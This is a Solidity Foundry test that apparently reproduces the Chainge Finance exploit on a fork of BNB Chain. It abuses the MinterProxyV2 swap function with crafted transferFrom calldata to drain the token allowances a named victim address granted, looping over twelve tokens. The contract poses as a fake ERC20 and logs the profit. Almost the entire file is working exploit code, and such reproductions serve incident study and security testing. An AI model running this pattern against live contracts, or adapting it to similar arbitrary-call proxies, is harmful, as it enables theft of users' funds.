// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface IMinterProxyV2 {
    function swap(
        address tokenAddr,
        uint256 amount,
        address target,
        address receiveToken,
        address receiver,
        uint256 minAmount,
        bytes calldata callData,
        bytes calldata order
    ) external;
}

contract ChaingeFinanceAttacker is Test {
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant sol = IERC20(0x570A5D26f7765Ecb712C0924E4De545B89fD43dF);
    IERC20 constant AVAX = IERC20(0x1CE0c2827e2eF14D5C4f29a091d735A204794041);
    IERC20 constant babydoge = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 constant FOLKI = IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
    IERC20 constant ATOM = IERC20(0x0Eb3a705fc54725037CC9e008bDede697f62F335);
    IERC20 constant TLOS = IERC20(0xb6C53431608E626AC81a9776ac3e999c5556717c);
    IERC20 constant IOTX = IERC20(0x9678E42ceBEb63F23197D726B29b1CB20d0064E5);
    IERC20 constant linch = IERC20(0x111111111117dC0aa78b770fA6A738034120C302);
    IERC20 constant link = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
    IERC20 constant btcb = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 constant eth = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    address constant victim = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;
    IMinterProxyV2 minterproxy = IMinterProxyV2(0x80a0D7A6FD2A22982Ce282933b384568E5c852bF);

    uint256 balance = 0;

    function setUp() public {
        vm.createSelectFork("bsc");
        vm.label(address(usdt), "USDT");
        vm.label(address(victim), "ChaingeFinance Victim Address");
        vm.label(address(minterproxy), "MinterProxyV2");
    }

    function testExploit() public {
        uint attackBlockNumber = 37880387;
        // uint attackBlockNumber = 37877306; // after victim's approve tx
        vm.rollFork(attackBlockNumber);

        address[12] memory targetToken = [
            address(usdt),
            address(sol),
            address(AVAX),
            address(babydoge),
            address(FOLKI),
            address(ATOM),
            address(TLOS),
            address(IOTX),
            address(linch),
            address(link),
            address(btcb),
            address(eth)
        ];

        for (uint i = 0; i < targetToken.length; i++) {
            _attack(targetToken[i]);
        }
    }

    function _attack(address targetToken) private {
        uint256 Balance = IERC20(targetToken).balanceOf(victim);
        uint256 Allowance = IERC20(targetToken).allowance(victim, address(minterproxy));
        uint256 amount = Balance < Allowance? Balance : Allowance;
        if (amount == 0) {
            emit log_named_string("No allowed targetToken", IERC20(targetToken).name());
            return;
        }
        bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
        minterproxy.swap(address(this), 1, targetToken, address(this), address(this), 1, transferFromData, bytes(hex"00"));
        emit log_named_string("targetToken", IERC20(targetToken).name());
        emit log_named_decimal_uint("profit", IERC20(targetToken).balanceOf(address(this)), IERC20(targetToken).decimals());
    }

    function balanceOf(address /*account*/) external view returns (uint256) {
        return balance;
    }

    function transfer(address /*recipient*/, uint256 /*amount*/) external pure returns (bool) {
        return true;
    }

    function allowance(address /*_owner*/, address /*spender*/) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address /*spender*/, uint256 /*amount*/) external pure returns (bool) {
        return true;
    }

    function transferFrom(address /*sender*/, address /*recipient*/, uint256 amount) external returns (bool) {
        balance += amount;
        return true;
    }
}